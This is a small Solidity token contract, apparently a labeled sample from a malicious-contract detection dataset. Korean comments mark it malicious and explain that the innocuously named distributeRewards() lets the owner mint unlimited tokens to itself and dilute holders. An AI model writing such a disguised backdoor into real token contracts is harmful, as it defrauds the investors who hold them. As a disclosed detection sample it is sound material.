// SPDX-License-Identifier: MIT
// LABEL: MALICIOUS
//
// 소유자가 상한 없이 토큰을 발행할 수 있습니다. distributeRewards()에는 상한
// 검사가 없으므로 소유자는 자신의 잔고를 제한 없이 늘려 보유자 지분을 희석할 수
// 있습니다. 함수 이름은 이러한 자기 발행 동작을 직접 드러내지 않습니다.
// 근거: distributeRewards()는 소유자 전용이며 공급량 상한을 검사하지 않습니다.
pragma solidity ^0.8.20;

contract HiddenMint {
    string public name = "Yield";
    string public symbol = "YLD";
    uint8  public constant decimals = 18;
    uint256 public totalSupply;
    address public owner;
    mapping(address => uint256) public balanceOf;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(uint256 initialSupply) {
        owner = msg.sender;
        totalSupply = initialSupply;
        balanceOf[msg.sender] = initialSupply;
        emit Transfer(address(0), msg.sender, initialSupply);
    }

    modifier onlyOwner() { require(msg.sender == owner, "not owner"); _; }

    // 공급량 상한을 검사하지 않습니다.
    function distributeRewards(uint256 amount) external onlyOwner {
        totalSupply += amount;
        balanceOf[owner] += amount;
        emit Transfer(address(0), owner, amount);
    }

    function transfer(address to, uint256 value) external returns (bool) {
        require(to != address(0), "zero address");
        require(balanceOf[msg.sender] >= value, "insufficient");
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);
        return true;
    }
}
